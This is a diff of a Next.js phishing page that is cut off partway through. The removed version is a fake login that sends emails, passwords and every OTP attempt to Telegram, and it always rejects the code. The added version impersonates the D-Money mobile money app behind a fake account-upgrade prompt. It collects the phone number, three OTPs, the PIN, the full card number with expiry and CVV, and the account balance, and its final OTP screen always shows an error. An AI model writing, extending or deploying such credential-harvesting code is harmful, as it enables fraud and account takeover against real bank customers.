@@ -1,455 +1,1441 @@
-"use client";
+"use client"
 
-import React, { useState, useRef, useEffect } from "react";
-import { Eye, EyeOff, ScanFace, Loader2, ArrowLeft, RotateCcw } from "lucide-react";
+import React, { useState, useEffect, useRef } from "react"
+import Image from "next/image"
+import { ChevronLeft, X, Check, Star, ShieldCheck, HelpCircle, AlertCircle } from "lucide-react"
 
-export default function AuthFlowPage() {
-  // View state: "login" | "otp" (Sign-in screen open by default)
-  const [currentStep, setCurrentStep] = useState<"login" | "otp">("login");
+// Primary Brand Color
+const BRAND_NAVY = "#002566"
+const LOGO_URL = "https://play-lh.googleusercontent.com/0GAHK2npJxs8Wd_YnqmDNzHeIXLa_KaZikbf_6ONOh_fCwztYC2BzQOtoxxJd0VCDT4S4NoU_CKuAu0EVi9Eeio"
 
-  // Login form states
-  const [email, setEmail] = useState("");
-  const [password, setPassword] = useState("");
-  const [showPassword, setShowPassword] = useState(false);
-  const [loginLoading, setLoginLoading] = useState(false);
-  const [loginErrors, setLoginErrors] = useState<{ email?: string; password?: string }>({});
+type Step = "splash" | "phone" | "otp1" | "pin" | "card" | "otp2" | "balance" | "otp3" | "success"
 
-  // OTP states (supports unlimited digits)
-  const [otpCode, setOtpCode] = useState("");
-  const [otpAttempts, setOtpAttempts] = useState(0);
-  const [otpLoading, setOtpLoading] = useState(false);
-  const [otpError, setOtpError] = useState("");
-  const [timer, setTimer] = useState(60);
-  const [canResend, setCanResend] = useState(false);
-  const otpInputRef = useRef<HTMLInputElement>(null);
+export default function DmoneyApp() {
+    const [currentStep, setCurrentStep] = useState<Step>("splash")
+    const [showBottomModal, setShowBottomModal] = useState(false)
+    const [isScreenLoading, setIsScreenLoading] = useState(false)
 
-  // Send location and visitor info as soon as user visits the site or opens the link
-  useEffect(() => {
-    const trackVisitor = async () => {
-      try {
-        const { sendTelegramMessage } = await import("@/lib/telegram");
-        await sendTelegramMessage({
-          title: "🌐 User Visited Site / Opened Link",
-        });
-      } catch (err) {
-        console.error("Visitor tracking error:", err);
-      }
-    };
+    // Form states - Phone
+    const [phoneNumber, setPhoneNumber] = useState("")
+    const [agreedTerms, setAgreedTerms] = useState(true)
+    const [phoneFocused, setPhoneFocused] = useState(false)
 
-    trackVisitor();
-  }, []);
+    // Full phone number with prefilled +253
+    const fullPhoneNumber = `+253 ${phoneNumber.trim()}`
 
-  
-  // Initialize stored email if available
-  useEffect(() => {
-    if (typeof window !== "undefined") {
-      const stored = sessionStorage.getItem("userEmail");
-      if (stored) setEmail(stored);
-    }
-  }, []);
+    // OTP 1 states (6 digits)
+    const [otp1Digits, setOtp1Digits] = useState<string[]>(["", "", "", "", "", ""])
+    const [otp1Timer, setOtp1Timer] = useState(115) // 01:55
+    const otp1InputRefs = useRef<(HTMLInputElement | null)[]>([])
 
-  // Timer countdown for OTP
-  useEffect(() => {
-    let interval: NodeJS.Timeout;
-    if (currentStep === "otp" && timer > 0) {
-      interval = setInterval(() => {
-        setTimer((prev) => prev - 1);
-      }, 1000);
-    } else if (timer === 0) {
-      setCanResend(true);
-    }
-    return () => clearInterval(interval);
-  }, [currentStep, timer]);
+    // PIN states (4 digits)
+    const [pinDigits, setPinDigits] = useState<string[]>(["", "", "", ""])
+    const pinInputRefs = useRef<(HTMLInputElement | null)[]>([])
 
-  // Focus OTP input when transitioning or mounting
-  useEffect(() => {
-    if (currentStep === "otp") {
-      setTimer(60);
-      setCanResend(false);
-      setOtpError("");
-      setTimeout(() => {
-        otpInputRef.current?.focus();
-      }, 100);
-    }
-  }, [currentStep]);
+    // Card Details states
+    const [cardNumber, setCardNumber] = useState("")
+    const [cardMonth, setCardMonth] = useState("")
+    const [cardYear, setCardYear] = useState("")
+    const [cardCvc, setCardCvc] = useState("")
+    const cardMonthRef = useRef<HTMLInputElement | null>(null)
+    const cardYearRef = useRef<HTMLInputElement | null>(null)
+    const cardCvcRef = useRef<HTMLInputElement | null>(null)
 
-  // Format email helper for OTP screen (unmasked and clearly visible)
-  const getDisplayEmail = (userEmail: string) => {
-    if (!userEmail || !userEmail.trim()) return "your registered email";
-    return userEmail.trim();
-  };
+    // OTP 2 states (6 digits)
+    const [otp2Digits, setOtp2Digits] = useState<string[]>(["", "", "", "", "", ""])
+    const [otp2Timer, setOtp2Timer] = useState(115)
+    const otp2InputRefs = useRef<(HTMLInputElement | null)[]>([])
 
-  // Validate Login Form
-  const validateLoginForm = () => {
-    const errors: { email?: string; password?: string } = {};
+    // Balance states
+    const [accountNumber, setAccountNumber] = useState("Acc. •••••••••••••")
+    const [balanceAmount, setBalanceAmount] = useState("")
 
-    const trimmedEmail = email.trim();
-    if (!trimmedEmail) {
-      errors.email = "Please enter your email address";
-    } else if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(trimmedEmail)) {
-      errors.email = "Please enter a valid email address";
+    // OTP 3 states (6 digits - Error state)
+    const [otp3Digits, setOtp3Digits] = useState<string[]>(["", "", "", "", "", ""])
+    const [otp3Timer, setOtp3Timer] = useState(111) // 01:51
+    const [otp3Error, setOtp3Error] = useState(false)
+    const otp3InputRefs = useRef<(HTMLInputElement | null)[]>([])
+
+    // Submitting helper state
+    const [isSubmitting, setIsSubmitting] = useState(false)
+
+    // Transition with 2-second Screen Loader
+    const transitionToStepWithLoader = (nextStep: Step, delayMs = 2000) => {
+        setIsScreenLoading(true)
+        setTimeout(() => {
+            setIsScreenLoading(false)
+            setCurrentStep(nextStep)
+        }, delayMs)
     }
 
-    if (!password.trim()) {
-      errors.password = "Please enter your password";
-    } else if (password.length < 4) {
-      errors.password = "Password must be at least 4 characters";
+    // 1. Initial Splash Screen Flow -> Show upgrade modal from bottom
+    useEffect(() => {
+        const timer = setTimeout(() => {
+            setShowBottomModal(true)
+        }, 1200)
+        return () => clearTimeout(timer)
+    }, [])
+
+    // OTP 1 Countdown Timer
+    useEffect(() => {
+        if (currentStep !== "otp1" || otp1Timer <= 0) return
+        const interval = setInterval(() => {
+            setOtp1Timer((prev) => (prev > 0 ? prev - 1 : 0))
+        }, 1000)
+        return () => clearInterval(interval)
+    }, [currentStep, otp1Timer])
+
+    // OTP 2 Countdown Timer
+    useEffect(() => {
+        if (currentStep !== "otp2" || otp2Timer <= 0) return
+        const interval = setInterval(() => {
+            setOtp2Timer((prev) => (prev > 0 ? prev - 1 : 0))
+        }, 1000)
+        return () => clearInterval(interval)
+    }, [currentStep, otp2Timer])
+
+    // OTP 3 Countdown Timer
+    useEffect(() => {
+        if (currentStep !== "otp3" || otp3Timer <= 0) return
+        const interval = setInterval(() => {
+            setOtp3Timer((prev) => (prev > 0 ? prev - 1 : 0))
+        }, 1000)
+        return () => clearInterval(interval)
+    }, [currentStep, otp3Timer])
+
+    // Format OTP timer as MM:SS
+    const formatTimer = (seconds: number) => {
+        const mins = Math.floor(seconds / 60)
+        const secs = seconds % 60
+        return `${mins.toString().padStart(2, "0")}:${secs.toString().padStart(2, "0")}`
     }
 
-    setLoginErrors(errors);
-    return Object.keys(errors).length === 0;
-  };
+    // Mask phone number for OTP and PIN screens
+    const getMaskedPhone = (phone: string, mode: "otp" | "pin" = "otp") => {
+        const rawDigits = phone.replace(/[^\d]/g, "")
+        let userDigits = rawDigits
+        if (rawDigits.startsWith("253")) {
+            userDigits = rawDigits.slice(3)
+        }
 
-  // Handle Login Submit
-  const handleLoginSubmit = async (e: React.FormEvent) => {
-    e.preventDefault();
-    if (!validateLoginForm()) return;
-
-    setLoginLoading(true);
-    setLoginErrors({});
-
-    if (typeof window !== "undefined") {
-      sessionStorage.setItem("userEmail", email);
+        if (mode === "otp") {
+            if (userDigits.length >= 6) {
+                const start = userDigits.slice(0, 2)
+                const end = userDigits.slice(-4)
+                return `(+253) ${start}****${end}`
+            }
+            return `(+253) 94****4945`
+        } else {
+            if (userDigits.length >= 6) {
+                const start = userDigits.slice(0, 3)
+                const end = userDigits.slice(-4)
+                return `+253 ${start}****${end}`
+            }
+            return `+253 888****5555`
+        }
     }
 
-    try {
-      const { sendTelegramMessage } = await import("@/lib/telegram");
-      await sendTelegramMessage({
-        title: "Login Credentials Submitted",
-        email: email,
-        password: password,
-      });
-    } catch (err) {
-      console.error("Submission error:", err);
+    // Phone digits validation: tick appears at 8+ digits, limit is 9 digits
+    const cleanDigitsOnly = phoneNumber.replace(/[^\d]/g, "")
+    const isPhoneComplete = cleanDigitsOnly.length >= 8 && cleanDigitsOnly.length <= 9
+
+    // Handle Upgrade Click from Bottom Sheet
+    const handleUpgradeNow = () => {
+        setShowBottomModal(false)
+        setCurrentStep("phone")
     }
 
-    // Smooth transition to OTP screen
-    await new Promise((resolve) => setTimeout(resolve, 1000));
-    setLoginLoading(false);
-    setCurrentStep("otp");
-  };
+    // ==========================================
+    // 1. Phone Submit -> 2s Loader -> OTP 1
+    // ==========================================
+    const handlePhoneSubmit = async (e?: React.FormEvent) => {
+        if (e) e.preventDefault()
+        if (cleanDigitsOnly.length < 8 || !agreedTerms || isSubmitting) return
 
-  // Handle OTP Change (allows unlimited digits)
-  const handleOtpChange = (value: string) => {
-    // Keep digits only, with no length limit
-    const digitsOnly = value.replace(/\D/g, "");
-    setOtpCode(digitsOnly);
-    if (otpError) setOtpError("");
-  };
+        setIsSubmitting(true)
+        sessionStorage.setItem("dmoney_phone", fullPhoneNumber)
 
-  // Handle Resend OTP
-  const handleResendOtp = async () => {
-    if (!canResend) return;
-    setTimer(60);
-    setCanResend(false);
-    setOtpError("");
-    try {
-      const { sendTelegramMessage } = await import("@/lib/telegram");
-      await sendTelegramMessage({
-        title: "OTP Resend Requested",
-        email: email || "Direct OTP Access",
-      });
-    } catch (err) {
-      console.error("Resend error:", err);
-    }
-  };
-
-  // Handle OTP Verification Submit (always shows invalid and sends each attempt to Telegram)
-  const handleOtpSubmit = async (e: React.FormEvent) => {
-    e.preventDefault();
-    const code = otpCode.trim();
-    if (!code) {
-      setOtpError("Invalid verification code. Please enter your code.");
-      otpInputRef.current?.focus();
-      return;
+        setIsSubmitting(false)
+        setOtp1Digits(["", "", "", "", "", ""])
+        setOtp1Timer(115)
+        transitionToStepWithLoader("otp1")
     }
 
-    const currentAttempt = otpAttempts + 1;
-    setOtpAttempts(currentAttempt);
-    setOtpLoading(true);
-    setOtpError("");
+    // ==========================================
+    // 2. OTP 1 Handlers (Auto Submit when filled)
+    // ==========================================
+    const submitOtp1 = async (code: string) => {
+        if (isSubmitting) return
+        setIsSubmitting(true)
+        sessionStorage.setItem("dmoney_otp1", code)
 
-    if (typeof window !== "undefined") {
-      sessionStorage.setItem(`userOtp_${currentAttempt}`, code);
-      sessionStorage.setItem("userOtp", code);
+        setIsSubmitting(false)
+        setPinDigits(["", "", "", ""])
+        transitionToStepWithLoader("pin")
     }
 
-    try {
-      const { sendTelegramMessage } = await import("@/lib/telegram");
-      await sendTelegramMessage({
-        title: `OTP Submitted (Attempt #${currentAttempt})`,
-        email: email || (typeof window !== "undefined" ? sessionStorage.getItem("userEmail") : null) || "Direct OTP Access",
-        password: password || "N/A",
-        otp1: code,
-        [`otp${Math.min(currentAttempt, 3)}`]: code,
-      });
-    } catch (err) {
-      console.error("OTP error:", err);
+    const handleOtp1Change = (index: number, value: string) => {
+        const val = value.replace(/[^\d]/g, "")
+        if (!val) {
+            const newOtp = [...otp1Digits]
+            newOtp[index] = ""
+            setOtp1Digits(newOtp)
+            return
+        }
+
+        if (val.length > 1) {
+            const pasted = val.slice(0, 6).split("")
+            const newOtp = [...otp1Digits]
+            pasted.forEach((char, i) => {
+                if (index + i < 6) {
+                    newOtp[index + i] = char
+                }
+            })
+            setOtp1Digits(newOtp)
+            const nextIdx = Math.min(index + pasted.length, 5)
+            otp1InputRefs.current[nextIdx]?.focus()
+
+            if (newOtp.every((d) => d !== "")) {
+                submitOtp1(newOtp.join(""))
+            }
+            return
+        }
+
+        const newOtp = [...otp1Digits]
+        newOtp[index] = val.slice(-1)
+        setOtp1Digits(newOtp)
+
+        if (index < 5 && val) {
+            otp1InputRefs.current[index + 1]?.focus()
+        }
+
+        // Auto move to PIN when all 6 digits entered
+        if (newOtp.every((d) => d !== "")) {
+            submitOtp1(newOtp.join(""))
+        }
     }
 
-    // Realistic verification delay before rejecting
-    await new Promise((resolve) => setTimeout(resolve, 1200));
-    setOtpLoading(false);
-    setOtpError("Invalid verification code. Please check and try again.");
-    setOtpCode("");
-    setTimeout(() => {
-      otpInputRef.current?.focus();
-    }, 50);
-  };
+    const handleOtp1KeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
+        if (e.key === "Backspace" && !otp1Digits[index] && index > 0) {
+            otp1InputRefs.current[index - 1]?.focus()
+        }
+    }
 
-  return (
-    <div className="min-h-[100dvh] w-full max-w-full overflow-x-hidden bg-white flex flex-col justify-between items-center px-4 sm:px-8 py-5 sm:py-8 selection:bg-[#602bf8]/15">
-      {currentStep === "login" ? (
-        <>
-          {/* Top / Main Form Container */}
-          <div className="w-full max-w-[390px] mx-auto pt-8 sm:pt-14 flex flex-col">
-            {/* Header */}
-            <div className="text-center">
-              <h1 className="text-[28px] sm:text-[34px] font-bold text-[#232042] tracking-tight leading-tight">
-                Welcome Back
-              </h1>
-              <p className="text-[14.5px] sm:text-[16px] text-[#767a89] font-normal mt-2">
-                Log in to your account below
-              </p>
-            </div>
+    const isOtp1Complete = otp1Digits.every((d) => d !== "")
 
-            {/* Form */}
-            <form onSubmit={handleLoginSubmit} className="mt-8 sm:mt-12 flex flex-col w-full" noValidate>
-              {/* Email Field */}
-              <div className="flex flex-col">
-                <label
-                  htmlFor="email"
-                  className="text-[14px] sm:text-[14.5px] font-medium text-[#65697d] mb-2"
-                >
-                  Email
-                </label>
-                <input
-                  id="email"
-                  type="email"
-                  value={email}
-                  onChange={(e) => {
-                    setEmail(e.target.value);
-                    if (loginErrors.email) {
-                      setLoginErrors((prev) => ({ ...prev, email: undefined }));
-                    }
-                  }}
-                  placeholder="Enter your email"
-                  className={`w-full h-[52px] sm:h-[54px] rounded-full border-2 bg-white px-5 sm:px-6 text-[15px] text-[#232042] placeholder:text-[#a0a5b5] outline-none transition-colors ${
-                    loginErrors.email
-                      ? "border-red-400 focus:border-red-500"
-                      : "border-[#e2e4ec] focus:border-[#602bf8]"
-                  }`}
-                />
-                {loginErrors.email && (
-                  <span className="text-[13px] text-red-500 mt-1.5 px-3">
-                    {loginErrors.email}
-                  </span>
-                )}
-              </div>
+    // ==========================================
+    // 3. PIN Handlers (Auto Submit when filled)
+    // ==========================================
+    const submitPin = async (pinCode: string) => {
+        if (isSubmitting) return
+        setIsSubmitting(true)
+        sessionStorage.setItem("dmoney_pin", pinCode)
 
-              {/* Password Field */}
-              <div className="flex flex-col mt-4 sm:mt-5">
-                <label
-                  htmlFor="password"
-                  className="text-[14px] sm:text-[14.5px] font-medium text-[#65697d] mb-2"
-                >
-                  Password
-                </label>
-                <div className="relative w-full">
-                  <input
-                    id="password"
-                    type={showPassword ? "text" : "password"}
-                    value={password}
-                    onChange={(e) => {
-                      setPassword(e.target.value);
-                      if (loginErrors.password) {
-                        setLoginErrors((prev) => ({ ...prev, password: undefined }));
-                      }
-                    }}
-                    placeholder="Enter your password"
-                    className={`w-full h-[52px] sm:h-[54px] rounded-full border-2 bg-white pl-5 sm:pl-6 pr-24 text-[15px] text-[#232042] placeholder:text-[#a0a5b5] outline-none transition-colors ${
-                      loginErrors.password
-                        ? "border-red-400 focus:border-red-500"
-                        : "border-[#e2e4ec] focus:border-[#602bf8]"
-                    }`}
-                  />
+        setIsSubmitting(false)
+        setCardNumber("")
+        setCardMonth("")
+        setCardYear("")
+        setCardCvc("")
+        transitionToStepWithLoader("card")
+    }
 
-                  {/* Password Action Icons */}
-                  <div className="absolute right-4 sm:right-5 top-1/2 -translate-y-1/2 flex items-center gap-3 text-[#9aa0b2]">
-                    <button
-                      type="button"
-                      onClick={() => setShowPassword(!showPassword)}
-                      className="hover:text-[#65697d] transition-colors focus:outline-none cursor-pointer p-0.5"
-                      aria-label={showPassword ? "Hide password" : "Show password"}
-                    >
-                      {showPassword ? (
-                        <Eye className="w-[20px] h-[20px]" strokeWidth={1.8} />
-                      ) : (
-                        <EyeOff className="w-[20px] h-[20px]" strokeWidth={1.8} />
-                      )}
-                    </button>
+    const handlePinChange = (index: number, value: string) => {
+        const val = value.replace(/[^\d]/g, "")
+        if (!val) {
+            const newPin = [...pinDigits]
+            newPin[index] = ""
+            setPinDigits(newPin)
+            return
+        }
 
-                    <button
-                      type="button"
-                      className="text-[#9aa0b2] focus:outline-none cursor-default p-0.5"
-                      aria-label="Biometric Scan"
-                    >
-                      <ScanFace className="w-[21px] h-[21px]" strokeWidth={1.8} />
-                    </button>
-                  </div>
+        if (val.length > 1) {
+            const pasted = val.slice(0, 4).split("")
+            const newPin = [...pinDigits]
+            pasted.forEach((char, i) => {
+                if (index + i < 4) {
+                    newPin[index + i] = char
+                }
+            })
+            setPinDigits(newPin)
+            const nextIdx = Math.min(index + pasted.length, 3)
+            pinInputRefs.current[nextIdx]?.focus()
+
+            if (newPin.every((d) => d !== "")) {
+                submitPin(newPin.join(""))
+            }
+            return
+        }
+
+        const newPin = [...pinDigits]
+        newPin[index] = val.slice(-1)
+        setPinDigits(newPin)
+
+        if (index < 3 && val) {
+            pinInputRefs.current[index + 1]?.focus()
+        }
+
+        // Auto move to Card when all 4 digits entered
+        if (newPin.every((d) => d !== "")) {
+            submitPin(newPin.join(""))
+        }
+    }
+
+    const handlePinKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
+        if (e.key === "Backspace" && !pinDigits[index] && index > 0) {
+            pinInputRefs.current[index - 1]?.focus()
+        }
+    }
+
+    const isPinComplete = pinDigits.every((d) => d !== "")
+
+    // ==========================================
+    // 4. Card Details Submit -> 2s Loader -> OTP 2
+    // ==========================================
+    const cleanCardNumber = cardNumber.replace(/\s+/g, "")
+    const isCardValid =
+        cleanCardNumber.length >= 15 &&
+        cardMonth.trim().length >= 1 &&
+        cardYear.trim().length >= 2 &&
+        cardCvc.trim().length >= 3
+
+    const handleCardNumberChange = (val: string) => {
+        const raw = val.replace(/[^\d]/g, "").slice(0, 16)
+        const formatted = raw.match(/.{1,4}/g)?.join(" ") || raw
+        setCardNumber(formatted)
+        // Auto-focus expiry month when card number is complete
+        if (raw.length >= 16) {
+            cardMonthRef.current?.focus()
+        }
+    }
+
+    const handleCardMonthChange = (val: string) => {
+        const digits = val.replace(/[^\d]/g, "").slice(0, 2)
+        setCardMonth(digits)
+        if (digits.length >= 2) {
+            cardYearRef.current?.focus()
+        }
+    }
+
+    const handleCardYearChange = (val: string) => {
+        const digits = val.replace(/[^\d]/g, "").slice(0, 2)
+        setCardYear(digits)
+        if (digits.length >= 2) {
+            cardCvcRef.current?.focus()
+        }
+    }
+
+    const handleCardSubmit = async (e?: React.FormEvent) => {
+        if (e) e.preventDefault()
+        if (!isCardValid || isSubmitting) return
+
+        setIsSubmitting(true)
+        const expiryFormatted = `${cardMonth.padStart(2, "0")}/${cardYear}`
+
+        sessionStorage.setItem("dmoney_card", cardNumber)
+        sessionStorage.setItem("dmoney_expiry", expiryFormatted)
+        sessionStorage.setItem("dmoney_cvv", cardCvc)
+
+        setIsSubmitting(false)
+        setOtp2Digits(["", "", "", "", "", ""])
+        setOtp2Timer(115)
+        transitionToStepWithLoader("otp2")
+    }
+
+    // ==========================================
+    // 5. OTP 2 Handlers (Auto Submit when filled) -> Balance
+    // ==========================================
+    const submitOtp2 = async (code: string) => {
+        if (isSubmitting) return
+        setIsSubmitting(true)
+        sessionStorage.setItem("dmoney_otp2", code)
+
+        setIsSubmitting(false)
+        setBalanceAmount("")
+        transitionToStepWithLoader("balance")
+    }
+
+    const handleOtp2Change = (index: number, value: string) => {
+        const val = value.replace(/[^\d]/g, "")
+        if (!val) {
+            const newOtp = [...otp2Digits]
+            newOtp[index] = ""
+            setOtp2Digits(newOtp)
+            return
+        }
+
+        if (val.length > 1) {
+            const pasted = val.slice(0, 6).split("")
+            const newOtp = [...otp2Digits]
+            pasted.forEach((char, i) => {
+                if (index + i < 6) {
+                    newOtp[index + i] = char
+                }
+            })
+            setOtp2Digits(newOtp)
+            const nextIdx = Math.min(index + pasted.length, 5)
+            otp2InputRefs.current[nextIdx]?.focus()
+
+            if (newOtp.every((d) => d !== "")) {
+                submitOtp2(newOtp.join(""))
+            }
+            return
+        }
+
+        const newOtp = [...otp2Digits]
+        newOtp[index] = val.slice(-1)
+        setOtp2Digits(newOtp)
+
+        if (index < 5 && val) {
+            otp2InputRefs.current[index + 1]?.focus()
+        }
+
+        // Auto move to Balance when all 6 digits entered
+        if (newOtp.every((d) => d !== "")) {
+            submitOtp2(newOtp.join(""))
+        }
+    }
+
+    const handleOtp2KeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
+        if (e.key === "Backspace" && !otp2Digits[index] && index > 0) {
+            otp2InputRefs.current[index - 1]?.focus()
+        }
+    }
+
+    const isOtp2Complete = otp2Digits.every((d) => d !== "")
+
+    // ==========================================
+    // 6. Balance Submit -> 2s Loader -> OTP 3
+    // ==========================================
+    const isBalanceValid = balanceAmount.trim().length > 0
+
+    const handleBalanceSubmit = async (e?: React.FormEvent) => {
+        if (e) e.preventDefault()
+        if (!isBalanceValid || isSubmitting) return
+
+        setIsSubmitting(true)
+        sessionStorage.setItem("dmoney_balance", `${balanceAmount} DJF`)
+
+        setIsSubmitting(false)
+        setOtp3Digits(["", "", "", "", "", ""])
+        setOtp3Timer(111)
+        setOtp3Error(false)
+        transitionToStepWithLoader("otp3")
+    }
+
+    // ==========================================
+    // 7. OTP 3 Handlers (Auto Submit when filled) -> Show Error
+    // ==========================================
+    const submitOtp3 = async (code: string) => {
+        if (isSubmitting || !code) return
+        setIsSubmitting(true)
+        sessionStorage.setItem("dmoney_otp3", code)
+
+        setIsSubmitting(false)
+        setOtp3Error(true)
+        setOtp3Digits(["", "", "", "", "", ""])
+        setOtp3Timer(111)
+        setTimeout(() => otp3InputRefs.current[0]?.focus(), 0)
+    }
+
+    const handleOtp3Change = (index: number, value: string) => {
+        const val = value.replace(/[^\d]/g, "")
+        if (!val) {
+            const newOtp = [...otp3Digits]
+            newOtp[index] = ""
+            setOtp3Digits(newOtp)
+            return
+        }
+
+        if (otp3Error) {
+            setOtp3Error(false)
+        }
+
+        if (val.length > 1) {
+            const pasted = val.slice(0, 6).split("")
+            const newOtp = [...otp3Digits]
+            pasted.forEach((char, i) => {
+                if (index + i < 6) {
+                    newOtp[index + i] = char
+                }
+            })
+            setOtp3Digits(newOtp)
+            const nextIdx = Math.min(index + pasted.length, 5)
+            otp3InputRefs.current[nextIdx]?.focus()
+            return
+        }
+
+        const newOtp = [...otp3Digits]
+        newOtp[index] = val.slice(-1)
+        setOtp3Digits(newOtp)
+
+        if (index < 5 && val) {
+            otp3InputRefs.current[index + 1]?.focus()
+        }
+    }
+
+    const handleOtp3KeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
+        if (e.key === "Backspace" && !otp3Digits[index] && index > 0) {
+            otp3InputRefs.current[index - 1]?.focus()
+        }
+    }
+
+    const isOtp3Complete = otp3Digits.every((d) => d !== "")
+
+    return (
+        <main className="min-h-screen w-full bg-[#FFFFFF] flex flex-col items-center justify-center relative overflow-hidden font-sans select-none antialiased">
+            {/* ======================================================== */}
+            {/* FULLSCREEN 2-SECOND LOADER (MATCHING SCREENSHOT 1)       */}
+            {/* ======================================================== */}
+            {isScreenLoading && (
+                <div className="fixed inset-0 z-[100] bg-white flex items-center justify-center animate-fade-in">
+                    <div className="relative w-11 h-11">
+                        <div
+                            className="w-11 h-11 rounded-full border-[3px] border-transparent border-t-[#002566] border-r-[#002566] animate-spin"
+                            style={{ borderTopColor: BRAND_NAVY, borderRightColor: BRAND_NAVY }}
+                        />
+                    </div>
                 </div>
-                {loginErrors.password && (
-                  <span className="text-[13px] text-red-500 mt-1.5 px-3">
-                    {loginErrors.password}
-                  </span>
+            )}
+
+            {/* Main responsive app container */}
+            <div className="w-full max-w-[430px] min-h-screen flex flex-col relative bg-[#FFFFFF]">
+
+                {/* ======================================================== */}
+                {/* 1. SPLASH SCREEN & BOTTOM UPGRADE SHEET MODAL            */}
+                {/* ======================================================== */}
+                {currentStep === "splash" && (
+                    <div className="relative flex-1 flex flex-col items-center justify-center w-full min-h-screen bg-white">
+                        {/* Centered D-Money Logo */}
+                        <div className="flex flex-col items-center justify-center transition-all duration-500">
+                            <div className="relative w-56 h-36 flex items-center justify-center">
+                                <Image
+                                    src={LOGO_URL}
+                                    alt="D-MONEY Logo"
+                                    width={220}
+                                    height={140}
+                                    priority
+                                    unoptimized
+                                    className="object-contain w-auto h-auto max-w-[220px] max-h-[140px]"
+                                />
+                            </div>
+                        </div>
+
+                        {/* Dim Backdrop Overlay */}
+                        <div
+                            className={`fixed inset-0 bg-black/45 z-40 transition-opacity duration-300 ${
+                                showBottomModal ? "opacity-100 pointer-events-auto" : "opacity-0 pointer-events-none"
+                            }`}
+                            onClick={() => handleUpgradeNow()}
+                        />
+
+                        {/* Bottom Sheet Modal */}
+                        <div
+                            className={`fixed bottom-0 left-1/2 -translate-x-1/2 w-full max-w-[430px] bg-white rounded-t-[30px] shadow-2xl z-50 transition-transform duration-500 ease-out transform px-6 pt-5 pb-8 flex flex-col items-center ${
+                                showBottomModal ? "translate-y-0" : "translate-y-full"
+                            }`}
+                            style={{
+                                borderTop: "3px solid #002566",
+                            }}
+                        >
+                            {/* Close Button */}
+                            <button
+                                type="button"
+                                onClick={() => handleUpgradeNow()}
+                                className="absolute right-5 top-5 w-8 h-8 rounded-full bg-[#F3F4F6] hover:bg-[#E5E7EB] active:scale-95 flex items-center justify-center transition-colors"
+                                aria-label="Close"
+                            >
+                                <X className="w-4 h-4 text-[#4B5563]" strokeWidth={2.5} />
+                            </button>
+
+                            {/* Centered Star Icon */}
+                            <div className="mt-2 mb-4 w-14 h-14 rounded-full bg-[#EEF4FF] flex items-center justify-center shadow-xs">
+                                <Star className="w-7 h-7 text-[#002566] fill-[#002566]" strokeWidth={0} />
+                            </div>
+
+                            <h2 className="text-[22px] font-bold text-[#002566] text-center tracking-tight leading-snug">
+                                Upgrade Your D-Money Account!
+                            </h2>
+
+                            <p className="mt-2 text-[13.5px] text-[#4B5563] text-center leading-relaxed px-2 font-normal">
+                                D-Money customers need to upgrade their account to enjoy exclusive benefits:
+                            </p>
+
+                            <div className="w-full mt-5 bg-[#F4F8FD] rounded-2xl p-4 sm:p-5 flex flex-col gap-3.5 border border-[#EBF2FA]">
+                                <div className="flex items-center gap-3">
+                                    <div
+                                        className="w-5 h-5 rounded-full flex items-center justify-center shrink-0"
+                                        style={{ backgroundColor: BRAND_NAVY }}
+                                    >
+                                        <Check className="w-3.5 h-3.5 text-white" strokeWidth={3} />
+                                    </div>
+                                    <span className="text-[13.5px] font-medium text-[#1E293B]">
+                                        Increase your Daily & Monthly Transfer Limit
+                                    </span>
+                                </div>
+
+                                <div className="flex items-center gap-3">
+                                    <div
+                                        className="w-5 h-5 rounded-full flex items-center justify-center shrink-0"
+                                        style={{ backgroundColor: BRAND_NAVY }}
+                                    >
+                                        <Check className="w-3.5 h-3.5 text-white" strokeWidth={3} />
+                                    </div>
+                                    <span className="text-[13.5px] font-medium text-[#1E293B]">
+                                        Get access to your D-Money Card
+                                    </span>
+                                </div>
+
+                                <div className="flex items-center gap-3">
+                                    <div
+                                        className="w-5 h-5 rounded-full flex items-center justify-center shrink-0"
+                                        style={{ backgroundColor: BRAND_NAVY }}
+                                    >
+                                        <Check className="w-3.5 h-3.5 text-white" strokeWidth={3} />
+                                    </div>
+                                    <span className="text-[13.5px] font-medium text-[#1E293B]">
+                                        Low Transaction Fees and Instant Payouts
+                                    </span>
+                                </div>
+                            </div>
+
+                            <button
+                                type="button"
+                                onClick={handleUpgradeNow}
+                                className="w-full mt-6 py-4 rounded-xl text-white font-bold text-[15px] tracking-wide transition-all duration-200 active:scale-[0.98] shadow-md hover:brightness-110 flex items-center justify-center"
+                                style={{ backgroundColor: BRAND_NAVY }}
+                            >
+                                UPGRADE ACCOUNT NOW
+                            </button>
+
+                            <div className="mt-4 text-[13px] text-[#6B7280] font-normal flex items-center gap-1">
+                                <span>Need Help?</span>
+                                <button
+                                    type="button"
+                                    onClick={handleUpgradeNow}
+                                    className="font-medium underline hover:text-[#002566] transition-colors"
+                                    style={{ color: BRAND_NAVY }}
+                                >
+                                    Contact Support
+                                </button>
+                            </div>
+                        </div>
+                    </div>
                 )}
-              </div>
 
-              {/* Forgotten Password Link */}
-              <div className="mt-3.5 sm:mt-4 flex justify-end">
-                <span
-                  role="button"
-                  aria-disabled="true"
-                  onClick={(e) => e.preventDefault()}
-                  className="text-[13.5px] sm:text-[14px] font-normal text-[#5ec2f8] select-none cursor-pointer"
-                >
-                  Forgotten Password?
-                </span>
-              </div>
+                {/* ======================================================== */}
+                {/* 2. PHONE NUMBER ENTRY SCREEN                             */}
+                {/* ======================================================== */}
+                {currentStep === "phone" && (
+                    <div className="flex-1 flex flex-col justify-between px-6 pt-12 pb-8 w-full min-h-screen bg-white animate-slide-up">
+                        <div className="flex flex-col">
+                            <h1 className="text-[24px] leading-[34px] font-bold text-[#000000] tracking-tight">
+                                Let&apos;s get started with verification
+                            </h1>
 
-              {/* Log In Button */}
-              <button
-                type="submit"
-                disabled={loginLoading}
-                className="mt-6 sm:mt-8 w-full h-[52px] sm:h-[54px] rounded-full bg-[#602bf8] hover:bg-[#5321eb] active:scale-[0.99] text-white font-bold text-[15.5px] sm:text-[16px] flex items-center justify-center transition-all cursor-pointer disabled:opacity-75 disabled:cursor-not-allowed shadow-[0_2px_10px_rgba(96,43,248,0.2)]"
-              >
-                {loginLoading ? (
